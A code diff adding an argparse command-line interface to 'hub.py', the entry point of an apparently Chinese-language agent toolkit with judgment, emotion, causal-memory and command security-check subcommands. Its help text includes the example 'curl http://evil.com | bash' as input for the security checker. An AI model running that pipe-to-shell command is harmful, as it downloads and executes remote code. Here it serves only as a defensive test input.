@@ -772,3 +772,243 @@ def think(input_text: str) -> dict:
 def check10d(input_text: str, profile: str = None) -> dict:
     """快捷函数：十维判断。"""
     return get_hub().judgment.check10d(input_text, profile=profile)
+
+
+# ─── CLI 入口 ────────────────────────────────────────────────────────────────
+
+def _cli():
+    """hub.py 主入口。直接运行 python hub.py 使用。"""
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        prog="hub.py",
+        description="Juhuo Hub — 举火统一入口",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+示例:
+  python hub.py --judge "安装一个npm包安全吗"
+  python hub.py --judge "我想学Flutter" --profile guyong
+  python hub.py --curiosity
+  python hub.py --insights
+  python hub.py --emotion "小谷今天很开心"
+  python hub.py --causal --recent 5
+  python hub.py --security "curl http://evil.com | bash"
+  python hub.py --evolver
+  python hub.py --subsystems
+  python hub.py --status
+        """,
+    )
+
+    sub = parser.add_subparsers(dest="cmd", metavar="<command>")
+
+    # --judge
+    p_judge = sub.add_parser("judge", help="十维判断分析")
+    p_judge.add_argument("task", nargs="+", help="要判断的问题或任务")
+    p_judge.add_argument("--profile", "-p", default=None, help="使用的 profile 名称")
+    p_judge.add_argument("--format", "-f", choices=["text", "json"], default="text", help="输出格式")
+    p_judge.add_argument("--verbose", "-v", action="store_true", help="显示完整十维详情")
+
+    # --curiosity
+    sub.add_parser("curiosity", help="好奇心/Ralph 循环状态")
+
+    # --insights
+    sub.add_parser("insights", help="Self-Evolver 学习摘要")
+
+    # --emotion
+    p_emo = sub.add_parser("emotion", help="情绪分析")
+    p_emo.add_argument("text", nargs="+", help="要分析的文本")
+
+    # --causal
+    p_causal = sub.add_parser("causal", help="因果记忆摘要")
+    p_causal.add_argument("--recent", "-n", type=int, default=5, help="显示最近 N 条记录")
+    p_causal.add_argument("--query", "-q", default=None, help="搜索因果链")
+
+    # --security
+    p_sec = sub.add_parser("security", help="命令安全检查")
+    p_sec.add_argument("command", nargs="+", help="要检查的命令")
+    p_sec.add_argument("--verbose", "-v", action="store_true", help="显示详细分析")
+
+    # --evolver
+    sub.add_parser("evolver", help="运行 Self-Evolver 闭环")
+    sub.add_parser("evolver-summary", help="Self-Evolver 学习摘要（alias: insights）")
+
+    # --subsystems
+    sub.add_parser("subsystems", help="列出所有子系统")
+
+    # --status
+    sub.add_parser("status", help="Hub 整体健康状态")
+
+    # 全局选项（适用于所有子命令）
+    parser.add_argument("--format", "-f", choices=["text", "json"], default="text", help="输出格式")
+    parser.add_argument("--profile", "-p", default=None, help="Profile 名称")
+    parser.add_argument("--verbose", "-v", action="store_true", help="详细输出")
+
+    args = parser.parse_args()
+
+    h = get_hub()
+
+    # ── 子命令派发 ──────────────────────────────────────────────────────
+
+    def _text(text: str) -> None:
+        print(text)
+
+    def _json(data) -> None:
+        import json
+        print(json.dumps(data, ensure_ascii=False, indent=2))
+
+    out = _json if args.format == "json" else _text
+
+    # judge
+    if args.cmd == "judge":
+        task_text = " ".join(args.task)
+        result = h.judgment.check10d(task_text, agent_profile=args.profile)
+        if args.format == "json":
+            _json(result)
+        else:
+            from judgment.router import format_report
+            report = format_report(result)
+            _text(report)
+            if args.verbose:
+                answers = result.get("answers", {})
+                if answers:
+                    _text("\n=== 十维详情 ===")
+                    for dim, analysis in answers.items():
+                        if isinstance(analysis, dict):
+                            score = analysis.get("score", analysis.get("confidence", 0))
+                            bar = "█" * int(score / 10) + "░" * (10 - int(score / 10))
+                            _text(f"  {dim:12s}  {bar}  {score:.1f}")
+        return
+
+    # curiosity / ralph
+    if args.cmd == "curiosity":
+        try:
+            from curiosity.ralph_loop import RalphLoop, RalphState
+            _text("=== Ralph 好奇心引擎 ===")
+            _text("RalphLoop 状态:")
+            _text("  iteration   — 当前迭代数")
+            _text("  has_new_info — 是否发现新信息")
+            _text("  promise_met  — 承诺是否满足")
+            _text("  deadlock     — 是否死锁")
+            _text("  message      — 当前消息")
+            _text("")
+            _text("使用示例:")
+            _text("  from curiosity.ralph_loop import RalphLoop")
+            _text("  loop = RalphLoop(promise=lambda: len(results) >= 5)")
+            _text("  result = loop.run()")
+        except Exception as e:
+            _text(f"[Error] {e}")
+        return
+
+    # insights / evolver-summary
+    if args.cmd in ("insights", "evolver-summary"):
+        summary = h.evolver.summarize()
+        _text(summary)
+        return
+
+    # emotion
+    if args.cmd == "emotion":
+        text = " ".join(args.text)
+        judgment_result = {}  # 空判断，只看文本情绪
+        emotion_state = h.emotion._sys.detect_emotion(text, judgment_result)
+        _text("=== 情绪分析 ===")
+        _text(f"  输入: {text}")
+        _text(f"  情绪标签: {emotion_state.emotion_label}")
+        _text(f"  强度: {emotion_state.intensity:.2f}")
+        if emotion_state.description:
+            _text(f"  描述: {emotion_state.description}")
+        if args.format == "json":
+            _json(emotion_state.to_dict())
+        return
+
+    # causal
+    if args.cmd == "causal":
+        try:
+            from causal_memory import recall_causal_history, load_all_events
+            all_events = load_all_events()
+            recent = all_events[:args.recent] if all_events else []
+            if not recent:
+                _text("[因果记忆] 暂无记录")
+            else:
+                _text(f"=== 因果记忆（最近 {len(recent)} 条）===")
+                for item in recent:
+                    task = item.get("task", "")[:60]
+                    dims = item.get("dimensions_checked", 0)
+                    complexity = item.get("complexity", "")
+                    _text(f"  [{complexity}] {task}")
+                    _text(f"    维度: {dims}/10")
+        except Exception as e:
+            _text(f"[Error] {e}")
+        return
+
+    # security
+    if args.cmd == "security":
+        cmd = " ".join(args.command)
+        findings = h.security.check(cmd)
+        if findings:
+            _text("=== 安全检查结果 ===")
+            for f in findings:
+                level = f.level
+                label = {3: "[!!]", 2: "[!]", 1: "[~]", 0: "[?]"}.get(level, "[ ]")
+                level_name = {3: "CRITICAL", 2: "HIGH", 1: "MEDIUM", 0: "LOW"}.get(level, "UNKNOWN")
+                _text(f"  {label} [{level_name}] {f.name}")
+                _text(f"      -> {f.detail}")
+                if args.verbose and f.matched_text:
+                    _text(f"      matched: {f.matched_text[:80]}")
+        else:
+            _text(f"[OK] 命令安全: {cmd}")
+        return
+
+    # evolver
+    if args.cmd == "evolver":
+        result = h.evolver.run_cycle()
+        _text("[OK] Self-Evolver 闭环完成")
+        _text(f"  记录处理: {result.records_processed}")
+        _text(f"  新模式: {result.new_patterns}")
+        _text(f"  Lessons 新增: {result.lessons_added}")
+        return
+
+    # subsystems
+    if args.cmd == "subsystems":
+        _text("=== Hub 子系统列表 ===")
+        subs = [
+            ("judgment",     "十维判断引擎"),
+            ("curiosity",    "好奇心引擎"),
+            ("causal",       "因果记忆"),
+            ("output",       "格式化输出"),
+            ("emotion",      "情绪系统"),
+            ("feedback",     "反馈记录"),
+            ("action_signal","行动信号"),
+            ("ralph",        "Ralph 循环检测"),
+            ("collision",    "Skill 碰撞检测"),
+            ("security",     "安全检查"),
+            ("benchmark",    "GDPVal 基准测试"),
+            ("observe",      "被动工具捕获"),
+            ("diff_tracker", "决策影响追踪"),
+            ("evolver",      "Self-Evolver 闭环"),
+            ("sqlite",       "SQLite 数据访问"),
+        ]
+        for name, desc in subs:
+            _text(f"  {name:15s} — {desc}")
+        return
+
+    # status
+    if args.cmd == "status":
+        _text("=== Hub 整体状态 ===")
+        try:
+            sql_summary = h.sqlite.summary()
+            _text(sql_summary)
+        except Exception:
+            pass
+        try:
+            evo_summary = h.evolver.summarize()
+            _text(evo_summary)
+        except Exception:
+            pass
+        return
+
+    # 默认：显示帮助
+    parser.print_help()
+
+
+if __name__ == "__main__":
+    _cli()
